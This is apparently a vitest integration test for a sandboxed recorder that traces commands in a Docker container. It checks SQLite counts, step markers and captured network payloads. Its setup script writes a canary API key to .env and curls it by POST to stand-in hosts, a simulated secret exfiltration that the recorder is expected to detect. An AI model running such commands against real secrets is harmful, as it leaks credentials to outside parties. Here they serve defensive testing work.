// [docker] Verifies, against the real box image, the formats the host parsers assume:
//   - ghost-count stdout: { "<absolute path>": { "<table>": n } | "unreadable" }
//   - the `probe` field of the steps.jsonl end marker written by ghost-step
//   - the base64 `body` field of the http/tls listener logs (-> RunOutput.payloads)
// Validates: Requirements 8.11, 8.14, 10.4, 12.4, 12.5
import { createHash, randomUUID } from 'node:crypto';
import { mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, expect, it } from 'vitest';
import { checkDockerAvailability } from '../src/docker/availability.js';
import { createBox, type Box } from '../src/docker/box.js';
import { createDockerClient } from '../src/docker/cli.js';
import { readTar } from '../src/recorder/collect.js';
import { parseCountOutput } from '../src/fs/sqlite.js';
import { describeDocker } from './docker-available.js';

const CANARY = 'sk-CANARY-abc123';
const client = createDockerClient();
const text = (b: Buffer): string => b.toString('utf8');

const SETUP = [
  'sqlite3 app.db "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT);' +
    " CREATE TABLE \\\"odd\\\"\\\"name\\\" (x INTEGER);" +
    " WITH RECURSIVE n(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM n WHERE i < 7) INSERT INTO users (id, name) SELECT i, 'u' || i FROM n;" +
    ' INSERT INTO \\"odd\\"\\"name\\" VALUES (1), (2);"',
  "printf 'this is not a database' > bad.db",
  `printf 'API_KEY=${CANARY}\\n' > .env`,
  'cat .env > /dev/null',
  `curl -s -m 5 -X POST --data '${CANARY}' http://wire-http.example/collect > /dev/null || true`,
  `curl -s -m 5 -X POST --data '${CANARY}-tls' https://wire-tls.example/collect > /dev/null || true`,
].join(' && ');

describeDocker('recorder wire formats against the real box image', () => {
  let dir = '';
  let runId = '';
  let box: Box | undefined;
  let containerId = '';
  let volumeName = '';
  let stepOutput: Awaited<ReturnType<Box['exec']>> | undefined;

  beforeAll(async () => {
    dir = realpathSync(mkdtempSync(join(tmpdir(), 'ghost-wire-')));
    writeFileSync(join(dir, 'placeholder.txt'), 'x\n');
    runId = `wire-${randomUUID()}`;
    const avail = await checkDockerAvailability(client, { limitMs: 10_000 });
    if (!avail.available) throw new Error(`box image unavailable: ${avail.reason}`);
    const created = await createBox(client, {
      runId,
      image: avail.imageRef,
      imageEnv: avail.imageEnv,
      mounts: { copyDir: dir },
      uid: process.getuid?.() ?? 1000,
      gid: process.getgid?.() ?? 1000,
      execLimitMs: 25_000,
      deadlineAt: Date.now() + 55_000,
    });
    if (!created.ok) throw new Error(`box not created: ${JSON.stringify(created)}`);
    box = created.box;
    containerId = box.containerId;
    const inspect = await client.run(['inspect', containerId]);
    const mounts = (JSON.parse(text(inspect.stdout)) as Array<{ Mounts: Array<{ Type: string; Name?: string }> }>)[0]?.Mounts ?? [];
    volumeName = mounts.find((m) => m.Type === 'volume')?.Name ?? '';
    stepOutput = await box.exec(0, SETUP);
  }, 60_000);

  afterAll(async () => {
    if (box !== undefined) await box.cleanup();
    if (dir !== '') rmSync(dir, { recursive: true, force: true });
    // Leaves no container and no volume behind.
    if (runId !== '') {
      const ps = await client.run(['ps', '-a', '-q', '--filter', `label=ghost-run.run-id=${runId}`]);
      expect(text(ps.stdout).trim()).toBe('');
    }
    if (volumeName !== '') {
      const vol = await client.run(['volume', 'inspect', volumeName]);
      expect(vol.code).not.toBe(0);
    }
  }, 30_000);

  it('runs the setup action to completion', () => {
    expect(stepOutput?.kind).toBe('exited');
    if (stepOutput?.kind === 'exited') expect(stepOutput.exitCode).toBe(0);
  });

  it('ghost-count prints { "<absolute path>": { table: n } | "unreadable" } and the host parser agrees', async () => {
    const raw = await client.run([
      'exec', '-w', '/work', containerId, 'ghost-count', '--', '/work/app.db', '/work/bad.db', '/work/missing.db',
    ]);
    expect(raw.code).toBe(0);
    const parsed = JSON.parse(text(raw.stdout)) as Record<string, unknown>;
    expect(parsed).toEqual({
      '/work/app.db': { users: 7, 'odd"name': 2 },
      '/work/bad.db': 'unreadable',
      '/work/missing.db': 'unreadable',
    });
    expect(parseCountOutput(text(raw.stdout), raw.code ?? 1, ['app.db', 'bad.db', 'missing.db'])).toEqual({
      'app.db': { users: 7, 'odd"name': 2 },
      'bad.db': 'unreadable',
      'missing.db': 'unreadable',
    });
    // Same through the Box API the pipeline uses.
    expect(await box?.countSqlite(['app.db', 'bad.db'])).toEqual({
      'app.db': { users: 7, 'odd"name': 2 },
      'bad.db': 'unreadable',
    });
  }, 30_000);

  it('ghost-step closes the step with {"end":i,"exit":code,"probe":true}', async () => {
    const cp = await client.run(['cp', `${containerId}:/ghost-rec`, '-']);
    expect(cp.code).toBe(0);
    const tar = readTar(cp.stdout, { maxTotalBytes: 64 << 20, maxEntryBytes: 64 << 20 });
    if (!tar.ok) throw new Error(tar.detail);
    const markers = text(tar.files.get('steps.jsonl') ?? Buffer.alloc(0))
      .split('\n')
      .filter((l) => l.trim() !== '')
      .map((l) => JSON.parse(l) as unknown);
    expect(markers).toEqual([{ end: 0, exit: 0, probe: true }]);
    expect(tar.files.has('step-0.strace')).toBe(true);
  }, 30_000);

  it('collect reads the base64 body fields into in-memory payloads linked to their events', async () => {
    const res = await box!.collect({ executedSteps: 1, secretPatterns: ['.env', '.env.*'] });
    expect(res.recorderOk).toBe(true);
    expect(res.diagnostics).toEqual([]);

    const http = res.events.find((e) => e.destination === 'wire-http.example:80');
    expect(http?.eventId).toBeDefined();
    const body = res.payloads.get(http?.eventId ?? '');
    expect(body === undefined ? undefined : Buffer.from(body).toString('utf8')).toBe(CANARY);

    // Every payload key is the eventId of exactly one event (Property 12 shape).
    const ids = res.events.flatMap((e) => (e.eventId === undefined ? [] : [e.eventId]));
    expect([...res.payloads.keys()].sort()).toEqual([...ids].sort());
    expect(new Set(ids).size).toBe(ids.length);

    // The serializable part holds only id, length and hash.
    const summary = res.payloadCaptures.find((c) => c.eventId === http?.eventId);
    expect(summary).toEqual({
      eventId: http?.eventId,
      byteLength: CANARY.length,
      sha256: createHash('sha256').update(CANARY).digest('hex'),
    });
    expect(JSON.stringify({ captures: res.captures, payloadCaptures: res.payloadCaptures, events: res.events })).not.toContain(CANARY);

    // Secret read recorded without content, and the TLS name is seen even if the body is not.
    expect(res.events).toContainEqual({ kind: 'secret-read', path: '.env', stepIndex: 0 });
    expect(res.events.some((e) => e.destination === 'wire-tls.example:443')).toBe(true);
    const tls = res.events.find((e) => e.destination === 'wire-tls.example:443');
    if (tls?.eventId !== undefined) {
      expect(Buffer.from(res.payloads.get(tls.eventId) ?? new Uint8Array()).toString('utf8')).toBe(`${CANARY}-tls`);
    }
  }, 30_000);
});
